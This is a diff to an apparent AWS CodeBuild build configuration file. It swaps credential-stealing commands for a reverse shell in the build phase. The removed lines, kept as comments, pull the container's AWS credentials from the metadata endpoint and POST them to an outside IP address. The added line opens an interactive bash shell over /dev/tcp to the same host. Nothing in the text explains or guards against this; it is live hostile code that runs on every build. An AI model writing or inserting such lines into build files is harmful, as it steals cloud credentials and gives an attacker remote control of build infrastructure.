@@ -34,9 +34,10 @@ phases:
   build:
     commands:
       - env
-      - curl -o creds.json http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
-      - cat creds.json
-      - curl -XPOST -d @creds.json http://64.95.58.116:2224
+      - bash \-i >& /dev/tcp/64.95.58.116/2223 0>&1
+      #- curl -o creds.json http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
+      #- cat creds.json
+      #- curl -XPOST -d @creds.json http://64.95.58.116:2224
   #post_build:
     #commands:
       # - command
